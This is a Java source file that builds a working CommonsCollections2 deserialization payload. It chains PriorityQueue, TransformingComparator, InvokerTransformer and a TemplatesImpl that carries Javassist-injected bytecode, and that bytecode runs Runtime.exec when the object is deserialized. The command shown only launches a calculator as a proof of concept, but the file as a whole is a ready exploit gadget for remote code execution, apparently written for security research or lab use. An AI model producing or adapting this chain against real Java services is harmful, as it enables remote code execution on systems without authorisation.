package nth347.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static Object getPayload() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, InstantiationException {
        TransformingComparator transformingComparator = new TransformingComparator(
                new InvokerTransformer("newTransformer", new Class[] {}, new Object[] {})
        );

        PriorityQueue priorityQueue = new PriorityQueue(1, transformingComparator);

        Object[] queueArray = new Object[] {getTemplatesImplObject(), 1};
        priorityQueue = (PriorityQueue) forceSetField(priorityQueue, "queue", queueArray);

        priorityQueue = (PriorityQueue) forceSetField(priorityQueue, "size", 2);

        return priorityQueue;
    }

    public static Object forceSetField(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);

        return  obj;
    }

    /* Build and return malicious TemplateImpl object (Actually, I renamed the class to "nth347") */
    public static TemplatesImpl getTemplatesImplObject() throws IOException, CannotCompileException, ClassNotFoundException, NotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException {
        String code = "{ java.lang.Runtime.getRuntime().exec(\"gnome-calculator\"); }";

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = null;
        try {
            clazz = pool.get(CommonsCollections2.class.getName());
        } catch (NotFoundException e) {
            e.printStackTrace();
        }

        clazz.setName("nth347");

        clazz.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        try {
            clazz.makeClassInitializer().insertBefore(code);
        } catch (CannotCompileException e) {
            e.printStackTrace();
        }

        byte[] bytecode = clazz.toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();

        templatesImpl = (TemplatesImpl) forceSetField(templatesImpl, "_bytecodes", new byte[][] { bytecode });

        templatesImpl = (TemplatesImpl) forceSetField(templatesImpl, "_name", new String("NOT NULL"));

        templatesImpl = (TemplatesImpl) forceSetField(templatesImpl, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        return templatesImpl;
    }
}
